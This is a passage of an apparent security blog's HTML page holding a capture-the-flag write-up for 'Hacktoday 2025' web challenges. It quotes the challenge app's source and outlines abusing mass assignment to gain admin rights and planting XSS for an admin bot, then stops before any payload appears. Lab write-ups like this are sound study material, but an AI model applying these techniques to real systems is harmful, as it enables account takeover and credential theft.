@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="DJumanto">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="DJumanto">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,write-up">
+    <meta name="description" content="">
+    <meta name="description" content="🖊️Author: DJumanto🛡️Team: HCS - https:&#x2F;&#x2F;schematics-its.com&#x2F;npc📖Note: This Writeup only contains solver for Web Exploitation Challenges  📚 Table of Contents Summary (TL;DR) Challenges Hackyesterday">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hacktoday 2025">
+<meta property="og:url" content="http://example.com/2025/12/11/ctf/web/HACKTODAY2025/index.html">
+<meta property="og:site_name" content="DJumanto Sec Blog">
+<meta property="og:description" content="🖊️Author: DJumanto🛡️Team: HCS - https:&#x2F;&#x2F;schematics-its.com&#x2F;npc📖Note: This Writeup only contains solver for Web Exploitation Challenges  📚 Table of Contents Summary (TL;DR) Challenges Hackyesterday">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyweQAcnxg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJDYPyo2lx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJzZTA52xx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkGX6R9heg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJrUaCq3xx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk3JJksnlx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1azk1ihgl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1A0k1i2lx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry-xgyinlx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1cUxkihxe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByKFlJjngl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1KeV1j2ge.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkP4B1inlg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJ-EIys3el.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hkm6Uki3gg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJvkDJinll.png">
+<meta property="article:published_time" content="2025-12-11T15:57:55.000Z">
+<meta property="article:modified_time" content="2025-12-11T15:59:19.988Z">
+<meta property="article:author" content="DJumanto">
+<meta property="article:tag" content="MASS ASSIGNMENT">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/HyweQAcnxg.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>Hacktoday 2025 · DJumanto Sec Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">DJumanto Sec Blog</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">DJumanto Sec Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">Hacktoday 2025</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                Hacktoday 2025
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="WEB">WEB</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="RCE">RCE</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="XSS">XSS</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="MASS ASSIGNMENT">MASS ASSIGNMENT</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2k</span>Reading time: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/12/11</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p>🖊️<strong>Author:</strong> DJumanto<br>🛡️<strong>Team:</strong> <a target="_blank" rel="noopener" href="https://schematics-its.com/npc">HCS - https://schematics-its.com/npc</a><br>📖<strong>Note:</strong> This Writeup only contains solver for Web Exploitation Challenges</p>
+<hr>
+<h1 id="📚-Table-of-Contents"><a href="#📚-Table-of-Contents" class="headerlink" title="📚 Table of Contents"></a>📚 Table of Contents</h1><ol>
+<li><a href="#Summary-tldr">Summary (TL;DR)</a></li>
+<li><a href="#Challenges">Challenges</a><ul>
+<li><a href="##Hackyesterday">Hackyesterday</a></li>
+<li><a href="##CSV">CSV</a></li>
+<li><a href="##Impossible-XSS">Impossible XSS</a></li>
+</ul>
+</li>
+<li><a href="#References">References</a></li>
+</ol>
+<hr>
+<h1 id="🔎-Summary-TL-DR"><a href="#🔎-Summary-TL-DR" class="headerlink" title="🔎 Summary (TL;DR)"></a>🔎 Summary (TL;DR)</h1><p>The final competitions web challenges contains XSS exploitations inside a file content, XSS in past Laravel CVE, and RCE from pandas unsafe input handling</p>
+<hr>
+<h1 id="🧾-Challenges"><a href="#🧾-Challenges" class="headerlink" title="🧾 Challenges"></a>🧾 Challenges</h1><h2 id="Hackyesterday"><a href="#Hackyesterday" class="headerlink" title="Hackyesterday"></a>Hackyesterday</h2><ul>
+<li>🤔Difficulity: Easy</li>
+<li>🕸️Vulnerability: Cross Site Scripting (XSS), Mass Assignment</li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>We were given a CTFd like web, where we able to create register, login, solve problems, and create challenges. </p>
+<h3 id="Approach"><a href="#Approach" class="headerlink" title="Approach"></a>Approach</h3><p>First thing i do is to find out where the flag is placed at, and it seems like they put it in an admin privilege user password.</p>
+<blockquote>
+<p><em>api&#x2F;src&#x2F;models.py</em></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.....Snippet.....</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_data</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Add users and challenges to the database&quot;&quot;&quot;</span></span><br><span class="line">    db = SessionLocal()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> db.query(Challenge).count() == <span class="number">0</span>:</span><br><span class="line">        db_challenges = [</span><br><span class="line">            Challenge(title=<span class="string">&quot;Cryptography&quot;</span>, description=<span class="string">&quot;17+8?&quot;</span>, score=<span class="number">20</span>, draft=<span class="literal">False</span>, flag=<span class="string">&quot;hackyesterday&#123;yeah&#125;&quot;</span>),</span><br><span class="line">            Challenge(title=<span class="string">&quot;Reverse Engineering&quot;</span>, description=<span class="string">&quot;bpi atnic uka&quot;</span>, score=<span class="number">30</span>, draft=<span class="literal">False</span>, flag=<span class="string">&quot;hackyesterday&#123;pembohong&#125;&quot;</span>),</span><br><span class="line">            Challenge(title=<span class="string">&quot;Pwn&quot;</span>, description=<span class="string">&quot;Siapa fans Linz disini?&quot;</span>, score=<span class="number">50</span>, draft=<span class="literal">False</span>, flag=<span class="string">&quot;hackyesterday&#123;aku_bang&#125;&quot;</span>),</span><br><span class="line">        ]</span><br><span class="line">        db.add_all(db_challenges)</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> db.query(User).count() == <span class="number">0</span>:</span><br><span class="line">        db_users = []</span><br><span class="line">        <span class="keyword">for</span> username <span class="keyword">in</span> [<span class="string">&quot;jokowo&quot;</span>, <span class="string">&quot;ganjal&quot;</span>, <span class="string">&quot;gibram&quot;</span>, <span class="string">&quot;prabomo&quot;</span>, <span class="string">&quot;bahlir&quot;</span>, <span class="string">&quot;kuch nafari&quot;</span>, <span class="string">&quot;arif satria&quot;</span>, <span class="string">&quot;when yh menang :(&quot;</span>]:</span><br><span class="line">            db_users.append(User(username=username, password=secrets.token_hex(),</span><br><span class="line">                last_solve=datetime.now() - timedelta(days=random.randint(<span class="number">1</span>, <span class="number">30</span>))</span><br><span class="line">            ))</span><br><span class="line"></span><br><span class="line">        random_user = random.choice(db_users)</span><br><span class="line">        random_user.is_admin = <span class="literal">True</span></span><br><span class="line">        random_user.password = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;FLAG not set.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        db.add_all(db_users)</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line">.....Snippet.....</span><br></pre></td></tr></table></figure>
+
+<p>So it seems our target is to leak the user password. Traversing on how can we get the user password, there’s a bot report functionality that we can use to make an admin bot (assume the user with flag password) to visit the challenge page.</p>
+<blockquote>
+<p><em>api&#x2F;src&#x2F;bot.py</em></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.....Snippet.....</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_and_view_challenges</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Simulates an admin user that logs in and views the challenges page&quot;&quot;&quot;</span></span><br><span class="line">    logging.info(<span class="string">&quot;Starting bot...&quot;</span>)</span><br><span class="line">    driver = setup_driver()</span><br><span class="line">    driver.get(BASE_URL + <span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line">    username, password = get_admin_credentials()</span><br><span class="line">    username_input = driver.find_element(By.ID, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">    username_input.send_keys(username)</span><br><span class="line"></span><br><span class="line">    password_input = driver.find_element(By.ID, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">    password_input.send_keys(password)</span><br><span class="line"></span><br><span class="line">    login_button = driver.find_element(By.ID, <span class="string">&quot;submit&quot;</span>)</span><br><span class="line">    login_button.click()</span><br><span class="line">    logging.info(<span class="string">&quot;Logged in as &#x27;%s&#x27; with password &#x27;%s&#x27;.&quot;</span>, username, password)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line">    </span><br><span class="line">.....Snippet.....</span><br></pre></td></tr></table></figure>
+
+<p>Then how do we attempt to create an XSS payload in the main challenge page? Because we need to be an admin to submit a challenge, the composition are as below:</p>
+<ol>
+<li>title</li>
+<li>description</li>
+<li>score</li>
+<li>flag</li>
+<li>attachment</li>
+</ol>
+<blockquote>
+<p><em>api&#x2F;src&#x2F;routes.py</em></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">...Snippets...</span><br><span class="line"></span><br><span class="line"><span class="meta">@api.post(<span class="params"><span class="string">&#x27;/challenges&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_challenge</span>(<span class="params"></span></span><br><span class="line"><span class="params">    challenge: ChallengeCreate,</span></span><br><span class="line"><span class="params">    current_user: Annotated[User, Depends(<span class="params">get_current_user</span>)],</span></span><br><span class="line"><span class="params">    db: Session = Depends(<span class="params">get_db</span>)</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_admin:</span><br><span class="line">        <span class="keyword">raise</span> HTTPException(status_code=<span class="number">403</span>, detail=<span class="string">&quot;You are not authorized to create challenges.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> challenge.score &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> HTTPException(status_code=<span class="number">400</span>, detail=<span class="string">&quot;Score must be positive.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(challenge.title) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="built_in">len</span>(challenge.description) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="built_in">len</span>(challenge.flag) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">raise</span> HTTPException(status_code=<span class="number">400</span>, detail=<span class="string">&quot;Title, description and flag must be at least 3 characters long.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> challenge.attachment_content <span class="keyword">or</span> <span class="keyword">not</span> challenge.attachment_filename:</span><br><span class="line">        db_challenge = Challenge(</span><br><span class="line">            title=challenge.title,</span><br><span class="line">            description=challenge.description,</span><br><span class="line">            score=challenge.score,</span><br><span class="line">            flag=challenge.flag</span><br><span class="line">        )</span><br><span class="line">        db.add(db_challenge)</span><br><span class="line">        db.commit()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Challenge created successfully.&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    file_content = b64decode(challenge.attachment_content)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(file_content) &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">raise</span> HTTPException(status_code=<span class="number">400</span>, detail=<span class="string">&quot;Attachment too big.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    file_extension = challenge.attachment_filename.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">1</span>].lower()</span><br><span class="line">    file_mimetype = magic.from_buffer(file_content, mime=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> file_extension <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_FILETYPES:</span><br><span class="line">        <span class="keyword">raise</span> HTTPException(status_code=<span class="number">400</span>, detail=<span class="string">&quot;Invalid attachment extension.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file_mimetype != ALLOWED_FILETYPES[file_extension]:</span><br><span class="line">        <span class="keyword">raise</span> HTTPException(status_code=<span class="number">400</span>, detail=<span class="string">&quot;Invalid attachment mimetype.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file_extension == <span class="string">&quot;pdf&quot;</span>:</span><br><span class="line">        file_name = os.path.join(<span class="string">&quot;pdf&quot;</span>, uuid4().<span class="built_in">hex</span> + <span class="string">&quot;.&quot;</span> + file_extension)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file_name = os.path.join(<span class="string">&quot;images&quot;</span>, uuid4().<span class="built_in">hex</span> + <span class="string">&quot;.&quot;</span> + file_extension)</span><br><span class="line"></span><br><span class="line">    file_path = os.path.join(UPLOADS_DIR, file_name)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> attachment_file:</span><br><span class="line">        attachment_file.write(file_content)</span><br><span class="line"></span><br><span class="line">    db_challenge = Challenge(</span><br><span class="line">        title=challenge.title,</span><br><span class="line">        description=challenge.description,</span><br><span class="line">        score=challenge.score,</span><br><span class="line">        flag=challenge.flag,</span><br><span class="line">        attachment_filename=os.path.join(<span class="string">&quot;uploads&quot;</span>, file_name),</span><br><span class="line">    )</span><br><span class="line">    db.add(db_challenge)</span><br><span class="line">    db.commit()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Challenge created successfully.&quot;</span>&#125;</span><br><span class="line">        </span><br><span class="line">...Snippets...</span><br></pre></td></tr></table></figure>
+
+<p>To create a challenge, we can abuse the mass assignment vulnerability in the registration process, where we can add <code>is_admin</code> to true.</p>
+<blockquote>
+<p><em>api&#x2F;src&#x2F;routes.py</em></p>
+</blockquote>
